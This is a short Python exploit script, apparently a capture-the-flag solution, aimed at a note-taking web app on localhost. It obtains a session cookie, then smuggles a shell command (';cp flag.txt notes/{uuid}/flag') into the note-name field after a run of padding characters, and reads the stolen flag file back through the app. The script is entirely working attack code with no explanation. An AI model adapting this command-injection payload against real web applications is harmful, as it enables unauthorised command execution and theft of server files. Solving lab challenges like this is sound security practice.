import requests

target = "http://localhost:55601"

s = requests.Session()

res = s.post(target + "/create", data={"name": "bleh", "body": "doesn't matter"})

uuid = res.cookies.get("uuid")

s.post(target + "/create", data={"name":f"*****************************************************************;cp flag.txt notes/{uuid}/flag", "body": "doesn't matter"})
print(res.text)

print(s.get(target + "/read?name=flag").text)
